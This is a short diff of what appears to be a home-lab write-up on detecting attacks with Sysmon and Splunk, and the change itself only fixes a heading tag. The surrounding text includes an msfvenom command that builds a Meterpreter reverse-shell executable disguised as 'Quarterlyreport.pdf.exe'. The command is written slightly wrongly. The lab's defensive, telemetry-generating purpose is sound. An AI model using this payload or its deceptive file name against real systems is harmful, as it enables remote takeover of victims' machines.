@@ -37,7 +37,7 @@ Installing Sysmon will enhance our ability to capture system events.(Since I don
 For Splunk configuration, I installed the Sysmon add-on and created the "endpoint" index. Our Sysmon config file will point to the index we created by its name, allowing Sysmon to send logs to our Splunk instance
 
 
-<h3>KALI SETUP<h3/>
+<h3>Kali Setup</h3>
   
   To create telemetry from our Kali VM to our Windows VM, we are going to use the well-known Metasploit pentesting tool.
 We will start by creating the Malware payload with this command: msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
